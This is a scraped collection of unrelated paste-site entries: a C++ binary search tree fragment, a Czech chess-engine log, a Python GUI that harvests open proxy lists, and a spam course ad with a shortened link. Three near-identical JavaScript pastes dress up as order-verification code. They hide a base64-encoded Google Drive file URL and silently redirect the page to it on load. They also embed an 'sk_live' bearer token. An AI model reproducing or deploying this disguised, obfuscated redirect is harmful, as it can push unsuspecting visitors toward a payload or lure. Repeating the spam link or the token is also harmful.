					parentNode->rightChild=tempNode;
					return;
				}
			}
		}
	}
}
bool BST(int item)
{
	node *currentNode=root;
	int flag=0;
	while(1)
	{
		if(currentNode->number==item)
		{
			return true;
		}
		else if(currentNode->number<item)
		currentNode=currentNode->rightChild;
		else
		currentNode=currentNode->leftChild;
		if(currentNode==NULL)
		return false;
	}
}
int main()
{
	ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
    int n;
    cin>>n;
    while(n--)
    {
    	int a;
    	cin>>a;
    	insertNode(a);
	}
	cout<<""Insertion done""<<endl;
	int item;
	cin>>item;
	if(BST(item))
	{
		cout<<item<<"" is found""<<endl;
	}
	else
	{
		cout<<item<<"" is not found""<<endl;
	}
}"
my0fEkFW,Market.js,kammex,JavaScript,Friday 11th of April 2025 12:50:28 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97885/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hV9ebasn,Untitled,kammex,JavaScript,Friday 11th of April 2025 12:35:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pFiic4S9,[Ver3.0 Supported GUI] FRESH HTTP(s)Proxy collection program by Python,r1rk,Python,Friday 11th of April 2025 12:28:23 PM CDT,"# This program does not support languages other than Japanese. Please do not be offended.
# You can run this program to get a list of up to about 300,000 or more proxies.

import tkinter as tk
from tkinter import ttk, messagebox
from datetime import datetime, timedelta
import requests
import threading
import re
import json
import os
 
ALL_PROXIES = set()
 
def get_past_dates(days=31):
    today = datetime.utcnow()
    return [(today - timedelta(days=i)).strftime(""%Y-%m-%d"") for i in range(days)]
 
def fetch_checkerproxy(date):
    try:
        url = f""https://api.checkerproxy.net/v1/landing/archive/{date}""
        res = requests.get(url, timeout=10)
        if res.status_code == 200:
            data = res.json()
            proxies = data['data'].get('proxyList', [])
            return proxies, True
        else:
            return [], False
    except:
        return [], False
 
def extract_from_text_url(url):
    try:
        res = requests.get(url, timeout=10)
        return re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d+\b', res.text)
    except:
        return []
 
def extract_from_json_url(url, ip_key=""IP"", port_key=""PORT""):
    try:
        res = requests.get(url, timeout=10)
        data = res.json()
        proxies = []
        for entry in data.get(""LISTA"", []):
            ip = entry.get(ip_key)
            port = entry.get(port_key)
            if ip and port:
                proxies.append(f""{ip}:{port}"")
        return proxies
    except:
        return []
 
def collect_proxies(log_widget, progress_bar, progress_label):
    global ALL_PROXIES
    ALL_PROXIES = set()
    now = datetime.now().strftime(""%Y-%m-%d_%H-%M"")
    folder = ""proxies_tool_result""
    if not os.path.exists(folder):
        os.makedirs(folder)
 
    filename_txt = os.path.join(folder, f""httpProxies_{now}.txt"")
    filename_json = os.path.join(folder, f""httpProxies_{now}.json"")
 
    dates = get_past_dates(31)
    skipped_dates = []
 
    log_widget.insert(tk.END, ""=== CheckerProxyの取得を開始します。 ===\n"")
    for i, date in enumerate(dates):
        proxies, success = fetch_checkerproxy(date)
        if success and proxies:
            ALL_PROXIES.update(proxies)
            log_widget.insert(tk.END, f""{date} の取得完了。 ({len(proxies)}件)\n"")
        else:
            skipped_dates.append(date)
            log_widget.insert(tk.END, f""{date} は取得できませんでした。\n"")
        progress_bar[""value""] = (i + 1) / len(dates) * 50
        progress_label.config(text=f""{int(progress_bar['value'])}%"")
        log_widget.yview_moveto(1)
        log_widget.update()
 
    log_widget.insert(tk.END, ""\n=== 他ソースからの取得を開始します。 ===\n"")
 
    proxy_sources = [
        ""https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt"",
        ""https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"",
        ""https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt"",
        ""https://api.openproxylist.xyz/http.txt"",
        ""https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"",
        ""https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"",
        ""https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt"",
        ""https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"",
        ""https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt"",
        ""https://rootjazz.com/proxies/proxies.txt"",
        ""https://proxyspace.pro/http.txt"",
        ""https://alexa.lr2b.com/proxylist.txt"",
        ""https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt""
        
    ]
 
    offset = 50 / len(proxy_sources)
    for idx, url in enumerate(proxy_sources):
        log_widget.insert(tk.END, f""{url} から取得中...\n"")
        proxies = extract_from_text_url(url)
        ALL_PROXIES.update(proxies)
        progress_bar[""value""] += offset
        progress_label.config(text=f""{int(progress_bar['value'])}%"")
        log_widget.yview_moveto(1)
        log_widget.update()
 
    log_widget.insert(tk.END, f""\n=== 合計取得件数: {len(ALL_PROXIES)} 件 ===\n"")
 
    with open(filename_txt, ""w"") as f:
        f.write(""\n"".join(sorted(ALL_PROXIES)))
 
    with open(filename_json, ""w"") as f:
        json.dump(sorted(ALL_PROXIES), f, indent=2)
 
    log_widget.insert(tk.END, f""\n保存完了: {filename_txt}, {filename_json}\n"")
    log_widget.yview_moveto(1)
    log_widget.update()
 
    stop_btn.pack(pady=5)
    stop_btn.config(state=""normal"")
 
def stop_application():
    root.quit()
 
def start_collection():
    threading.Thread(target=collect_proxies, args=(log_text, progress, progress_label), daemon=True).start()
 
root = tk.Tk()
root.title(""proxies_collect_tool"")
root.geometry(""640x480"")
 
label = tk.Label(root, text=""HTTP(s) Proxy収集ツール"", font=(""Meiryo"", 14, ""bold""))
label.pack(pady=10)
 
progress = ttk.Progressbar(root, length=500, mode='determinate')
progress.pack(pady=5)
 
progress_label = tk.Label(root, text=""0%"", font=(""Meiryo"", 10))
progress_label.place(relx=0.5, rely=0.3, anchor=""center"")
 
btn = tk.Button(root, text=""Go!"", command=start_collection, font=(""Meiryo"", 12))
btn.pack(pady=5)
 
log_text = tk.Text(root, height=20, wrap=tk.WORD)
log_text.pack(fill=tk.BOTH, padx=10, pady=10, expand=True)
 
stop_btn = tk.Button(root, text=""終了"", command=stop_application, font=(""Meiryo"", 12), state=""disabled"")
 
root.mainloop()"
Gqtf4zqL,amazonka netaha optimalne,max2201111,Python,Friday 11th of April 2025 12:21:29 PM CDT,"Šachový engine s čistým minimaxem
=================================
Analyzuji pozici: 8/8/8/a7/2k1C3/8/8/K7 b - - 0 1

Počáteční pozice:
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 a . . . . . . . 5
4 . . k . C . . . 4
3 . . . . . . . . 3
2 . . . . . . . . 2
1 K . . . . . . . 1
  a b c d e f g h
Na tahu je: Černý
Hloubka 1: Čas = 0.374s, Dokončeno!
Hloubka 2: Čas = 0.126s, Dokončeno!
Hloubka 3: Čas = 1.920s, Dokončeno!as: 18:46:49
Nalezen mat v hloubce 3!

Tah 1: Černý - Král c4-b3
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 a . . . . . . . 5
4 . . . . C . . . 4
3 . k . . . . . . 3
2 . . . . . . . . 2
1 K . . . . . . . 1
  a b c d e f g h

Tah 2: Bílý - Kardinál e4-a4
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 a . . . . . . . 5
4 C . . . . . . . 4
3 . k . . . . . . 3
2 . . . . . . . . 2
1 K . . . . . . . 1
  a b c d e f g h

Tah 3: Černý - Amazonka a5-e1
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 C . . . . . . . 4
3 . k . . . . . . 3
2 . . . . . . . . 2
1 K . . . a . . . 1
  a b c d e f g h

Šach mat!

Kompletní matová posloupnost:
1. Černý: Král c4-b3
2. Bílý: Kardinál e4-a4
3. Černý: Amazonka a5-e1"
vyDCS1kq,JavaScript: the ULTIMATE training,f0f077,JavaScript,Friday 11th of April 2025 12:20:53 PM CDT,"JavaScript: the ULTIMATE training
Master JavaScript with the most comprehensive course online! Projects, exercises, quizzes, ES8, and more!
What you will learn
Using AJAX requests
Understanding how to use jQuery
Have everything you need to REALLY master JavaScript
Add, modify, delete DOM elements
for more:http://earnow.online/19R15b"
CadYuh7q,Products.js,kammex,JavaScript,Friday 11th of April 2025 12:17:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89597/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
